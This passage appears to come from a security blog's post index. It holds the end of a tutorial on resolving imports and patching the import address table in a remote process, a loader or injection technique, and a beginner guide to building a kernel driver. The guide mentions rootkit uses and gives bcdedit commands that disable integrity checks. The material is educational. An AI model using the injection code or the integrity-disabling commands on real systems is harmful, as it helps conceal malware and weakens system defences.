firstThunk originalThunk : where the pe stores the function names it needs whether using names or ordinal firstThunk : where the pe stores the actual addresses of these functions and this is what we need to patch we can read them both this way PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)(BaseAddress + importDesc-&gt;OriginalFirstThunk); PIMAGE_THUNK_DATA firstThunk = (PIMAGE_THUNK_DATA)(BaseAddress + importDesc-&gt;FirstThunk); now we have addresses to them we start by getting the function names inside the originalthunk while(origThunk-&gt;u1.AddressOfData) so there r two cases for functions whether we should import them by ordinal or by names lets start with ordinal we do the following pick the origThunk-&gt;u1.Ordinal and (and &amp;) it with IMAGE_ORDINAL_FLAG64 which is 0x8000000000000000 in x64 what this does is check if the ordinal bit is set if true then we need to import by ordinal to do so we extract the ordinal by again using the &amp; operator with the ordinal WORD ordinal = (WORD)(origThunk-&gt;u1.Ordinal &amp; 0xFFFF); this way we extract the ordinal only finally we get the address funcAddress = GetProcAddress(dllHandle, (LPCSTR)(uintptr_t)ordinal); now for imports by name we need to first get the structure PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(BaseAddress + origThunk-&gt;u1.AddressOfData); then we have the name char* funcName = (char*)importByName-&gt;Name; all we need to do is get the address with funcAddress = GetProcAddress(dllHandle, funcName); for the final step which we did all of this for we need to patch the iat table first we need its address first we calculate the offset using ULONGLONG offset = (BYTE*)firstThunk - (BYTE*)BaseAddress; this gives us the offset of the entry inside the iat table we can get this from our process since we have the offset we just add it to the remote base ULONGLONG remoteIATEntry = (ULONGLONG)RemoteAddress + offset; finally we path the iat table using WriteProcessMemmory() and thats it now the iat table is patched and the imports are resolved FULL CODE : \tif (ntHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress != 0) \t{ \t\tDWORD importRVA = ntHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; \t\tDWORD importSize = ntHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size; \t\tIMAGE_IMPORT_DESCRIPTOR* importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(BaseAddress + ntHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); \t\tSIZE_T descriptorSize = sizeof(IMAGE_IMPORT_DESCRIPTOR); \t\tPIMAGE_IMPORT_DESCRIPTOR currentDesc = importDesc; \t\twhile (currentDesc-&gt;Name) \t\t{ \t\t\tconst char* dllName = (char*)(BaseAddress + currentDesc-&gt;Name); \t\t\tHMODULE dllHandle = GetModuleHandleA(dllName); \t\t\tif (!dllHandle) dllHandle = LoadLibraryA(dllName); \t\t\tPIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)(BaseAddress + currentDesc-&gt;OriginalFirstThunk); \t\t\tPIMAGE_THUNK_DATA firstThunk = (PIMAGE_THUNK_DATA)(BaseAddress + currentDesc-&gt;FirstThunk); \t\t\twhile (origThunk-&gt;u1.AddressOfData) \t\t\t{ \t\t\t\tFARPROC funcAddress = NULL; \t\t\t\tif (origThunk-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG64) \t\t\t\t{ \t\t\t\t\tWORD ordinal = (WORD)(origThunk-&gt;u1.Ordinal &amp; 0xFFFF); \t\t\t\t\tfuncAddress = GetProcAddress(dllHandle, (LPCSTR)(uintptr_t)ordinal); \t\t\t\t} \t\t\t\telse \t\t\t\t{ \t\t\t\t\tPIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(BaseAddress + origThunk-&gt;u1.AddressOfData); \t\t\t\t\tchar* funcName = (char*)importByName-&gt;Name; \t\t\t\t\tfuncAddress = GetProcAddress(dllHandle, funcName); \t\t\t\t \t\t\t\t} ULONGLONG remoteIATEntry = (ULONGLONG)NewAddress + ((BYTE*)firstThunk - (BYTE*)BaseAddress); \t\t\t\tSIZE_T bytesWritten1 = 0; \t\t\t\tif (!WriteProcessMemory(pi.hProcess, (LPVOID)remoteIATEntry, &amp;funcAddress, sizeof(funcAddress), &amp;bytesWritten1)) { \t\t\t\t\terror(\"Failed to write to remote IAT\"); \t\t\t\t\treturn -1; \t\t\t\t} \t\t\t\torigThunk++; \t\t\t\tfirstThunk++; \t\t\t \t\t\t} \t\t\t currentDesc++; \t\t} \t} " }, { "title": "Create Your First Windows Driver", "url": "/R4vensP1t/posts/Create-Your-First-Windows-Driver/", "categories": "Documentations, poc", "tags": "windows, kernel, driver, guide", "date": "2025-07-28 04:08:03 +0000", "content": "Hello From Kernel In this guide i will help you write your first windows kernel driver using kmdf This Guide Will Cover What are drivers Prerequisite User Mode VS Kernel Mode Code WalkThrough Compiling and loading the driver What Are Drivers A driver is a piece of software that allows the operating system to communicate with hardware devices. In our case, we are developing what’s known as a software driver, a type of driver that facilitates communication between user mode and kernel mode, without necessarily interacting with physical hardware. These drivers are essential for tasks that require privileged access to system resources, such as monitoring, hooking, or custom control mechanisms. When it comes to malware and rootkits, drivers take on a more malicious role. In this context, a driver can be used to gain low-level access to the operating system, often bypassing security mechanisms like User Account Control (UAC) or antivirus protections. Kernel-mode drivers used by rootkits can hide files, processes, or registry keys, intercept system calls, and exert stealthy control over the system—making them one of the most powerful tools in advanced malware development. Prerequisite First of all you really don’t want to test drivers on your main (host) machine since any fatal mistake will make your system crash therefore having a testing environnement is so important i advice using a virtual machine you can use vmware (free version) or virtual box which is free as well once you have the testing machine ready disable memory integrity options from the windows security settings then we need to enable test signing to do so run the following commands on an elevated cmd (run as administrator) bcdedit.exe -set loadoptions DISABLE_INTEGRITY_CHECKS bcdedit.exe -set TESTSIGNING ON you might get something like “The value is protected by Secure Boot policy and cannot be modified or deleted” in this case you have secure boot on you should go google how to disable secure boot for your machine usually from the bios now we are done from setting up the testing machine lets set up the machine where we will be coding our diver, first you will need to install visual studio, sdk and wdk here is a guide by microsoft next we can set up kernel debugging using windbg but its pretty complicated and unnecessary for now so we you can just download DebugView on the testing machine finally we create a kmdf empty project using visual studio add a main.c under your source folder and delete the driver you will find under driver files since we dont need it User Mode VS Kernel Mode for security, stability, and control reasons execution is split into two modes : — user mode where normal programs like browsers games text editors run it cannot access memory used by the os and needs to call the os using high level api windows functions in order to do such things, programs in user mode has a private virtual memory meaning when a process runs it thinks it owns the entire memory to it self this is implemented for security reasons as well as other reasons read this for more infos on virtual memory — kernel mode where the kernel itself, drivers and os programs run it can literally do anything in this system in kernel mode you have full access to hardware, memory and system resources all programs that run in kernel mode share the same virtual space meaning if something happens to one program it will crash the entire system leading to a BSOD or other fatal errors drivers are like a bridge that allow us to run code in kernel space Code WalkThrough Now We will code a simple hello world from the kernel poc we need to be very careful when coding drivers and we need to follow a spesific structure open main.c and lets start coding first we include #include &lt;ntddk.h&gt; which has everything we need to code our driver next we define something called a tag which is used to track down memory allocations made by the driver we use this for debugging so we can easily know what driver allocated this memory space #define DRIVER_TAG 'gaT' first we write the name in reverse due to the little endian and use single quotes we also need to define a UNICODE_STRING which is a structure for unicode strings which a lot of low level functions need it has 3 fields length which is the size of the buffer in bytes and not null terminated MaximumLength which is the max size the buffer can hold buffer the actual unicode string so UNICODE_STRING g_RegPath; next we define our entrypoint which is NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) the driverobject is a struct that holds all the important infos about our drivers it has things like DriverObject-&gt;DriverUnload which is the code that will get executed once the driver is unloaded this struct is very important and is like a handle to control the driver, the registery path is a unicode string that has something like “\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MyDriver” we will print it later inside our function we will be using something calledDbgPrint(); which is just like printf() in user mode this function will allow us to debug the driver using print statements we can later read using debugging tools, next we print the driverobject and the registerypath like this \tDbgPrint(\"[+] Driver Object: %p\\n\", DriverObject); \tDbgPrint(\"[+] Registry Path: %p\\n\", RegistryPath); next we will allocate space for our buffer to populate our g_RegPath unicode string struct we do this so can save the reg path for later use since its only save to access it i the DriverEntry only to do this we will get into memory allocation in kernel mode, there are more than one function to allocate space in kernel mode unlike use mode where we can use malloc we can use ExAllocatePool2() which is a new function used to allocate space in memory safely so g_RegPath.Buffer = (PWSTR)ExAllocatePool2(POOL_FLAG_PAGED, RegistryPath-&gt;Length, DRIVER_TAG) we are allocating space for our buffer and we store the pointer inside g_RegPath.Buffer the first argument is POOL_FLAG_PAGED read more about memory pools here next we can how many bytes we will allocate RegistryPath-&gt;Length which is the length of the regpath buffer, finally we have the tag we will use for this memory space DRIVER_TAG which is Test in our case next we run a test to see if it the buffer is still null just like with malloc \tif (g_RegPath.Buffer == NULL) \t{ \t\tDbgPrint(\"[-] Failed To Allocate Space For The Reg\"); \t\treturn STATUS_NO_MEMORY; \t} then we copy the registerypath from the param into our buffer using memcpy memcpy(g_RegPath.Buffer, RegistryPath-&gt;Buffer, RegistryPath-&gt;Length); also we set the length to same length `\tg_RegPath.Length = g_RegPath.MaximumLength = RegistryPath-&gt;Length; and finally we dbgprint a message \tDbgPrint(“Param Key Copy %wZ\\n”,g_RegPath)` now we need to set DriverObject-&gt;DriverUnload into our unload function which will run when the driver unload DriverObject-&gt;DriverUnload = UnloadMe so make sure you defined this function before the DriverEntry Function so the compiler can recognize it now we code the actual UnloadMe function it takes one param which is the driverobject struct for now we will just free the allocated space which is something you should always do in kernel mode void UnloadMe(PDRIVER_OBJECT DriverObject) { \tUNREFERENCED_PARAMETER(DriverObject); \tDbgPrint(\"[+] Driver unloaded successfully.\\n\"); \tDbgPrint(\"[+] Driver Object: %p\\n\", DriverObject); \t \tif (g_RegPath.Buffer != NULL) { \t\tExFreePool(g_RegPath.Buffer); \t\tg_RegPath.Buffer = NULL; \t} \t \tDbgPrint(\"[+] Driver Unloaded\\n\"); } we used ExFreePool(g_RegPath.Buffer); which is just like free() in um Compiling and loading the driver to build the project just build in visual studio and make sure you do so in debug mode or all the debug messages wont appear to install the driver we will use Service Controller (sc.exe) to do so we run this command sc create HelloWorldDriver type= kernel binPath= C:\\MyDrivers\\HelloWorldDriver.sys change the path into ur dirver’s path you can also change HelloWorldDriver into whatever name u want now open DebugView and enable all the kernel capture options under capture finally we load the driver with sc start HelloWorldDriver or whatever name u chose you should see the messages appear in your DebugView interface if u dont its because you didnt enable the correct options under the capture tab to unload the driver we use sc stop HelloWorldDriver FULL CODE : #include &lt;ntddk.h&gt; #define DRIVER_TAG 'bdwh' UNICODE_STRING g_RegPath; void UnloadMe(PDRIVER_OBJECT); NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { \tDbgPrint(\"[+] Driver loaded successfully.\\n\"); \tDbgPrint(\"[+] Driver Object: %p\\n\", DriverObject); \tDbgPrint(\"[+] Registry Path: %p\\n\", RegistryPath); \tg_RegPath.Buffer = (PWSTR)ExAllocatePool2(POOL_FLAG_PAGED, RegistryPath-&gt;Length, DRIVER_TAG); \tif (g_RegPath.Buffer == NULL) \t{ \t\tDbgPrint(\"[-] Failed To Allocate Space For The Reg\"); \t\treturn STATUS_NO_MEMORY; \t} \t \tmemcpy(g_RegPath.Buffer, RegistryPath-&gt;Buffer, RegistryPath-&gt;Length); \tg_RegPath.Length = g_RegPath.MaximumLength = RegistryPath-&gt;Length; \tDbgPrint(\"Param Key Copy %wZ\\n\",g_RegPath); \tDriverObject-&gt;DriverUnload = UnloadMe; \t \t \treturn STATUS_SUCCESS; } void UnloadMe(PDRIVER_OBJECT DriverObject) { \tUNREFERENCED_PARAMETER(DriverObject); \tDbgPrint(\"[+] Driver unloaded successfully.\\n\"); \tDbgPrint(\"[+] Driver Object: %p\\n\", DriverObject); \t \tif (g_RegPath.Buffer != NULL) { \t\tExFreePool(g_RegPath.Buffer); \t\tg_RegPath.Buffer = NULL; \t} \t \tDbgPrint(\"[+] Driver Unloaded\\n\"); } " } ]
